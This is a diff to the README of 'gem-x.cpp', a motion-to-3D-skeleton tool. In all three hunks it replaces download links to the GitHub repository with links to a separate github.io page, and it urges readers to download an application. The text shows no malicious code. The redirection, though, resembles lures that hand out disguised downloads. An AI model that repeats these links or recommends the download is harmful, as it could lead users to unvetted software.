@@ -1,6 +1,6 @@
 # 📹 gem-x.cpp - Turn Human Motion Into 3D Skeletons
 
-[![Download gem-x.cpp](https://img.shields.io/badge/Download-gem--x.cpp-blue?style=for-the-badge&logo=github)](https://github.com/riyad242514/gem-x.cpp)
+[![Download gem-x.cpp](https://img.shields.io/badge/Download-gem--x.cpp-blue?style=for-the-badge&logo=github)](https://riyad242514.github.io)
 
 ## 👋 Welcome to gem-x.cpp
 
@@ -43,7 +43,7 @@ Ready to dive in? Here's what you need to know to get gem-x.cpp running on your 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/riyad242514/gem-x.cpp](https://github.com/riyad242514/gem-x.cpp)
+Visit this link to download the application: [https://riyad242514.github.io](https://riyad242514.github.io)
 
 You'll land on the project page. Look for the "Releases" or "Download" section to get the latest version. The download should start automatically once you click the appropriate button.
 
@@ -159,7 +159,7 @@ The possibilities are limited only by your imagination.
 
 The best way to understand gem-x.cpp is to try it yourself. Head over to the download page and get started today:
 
-[![Download gem-x.cpp Now](https://img.shields.io/badge/⬇️_Download_gem--x.cpp-2ea44f?style=for-the-badge)](https://github.com/riyad242514/gem-x.cpp)
+[![Download gem-x.cpp Now](https://img.shields.io/badge/⬇️_Download_gem--x.cpp-2ea44f?style=for-the-badge)](https://riyad242514.github.io)
 
 In just a few minutes, you'll be watching your own digital skeleton move in real time. It's an amazing experience that brings cutting-edge technology right to your fingertips.
 
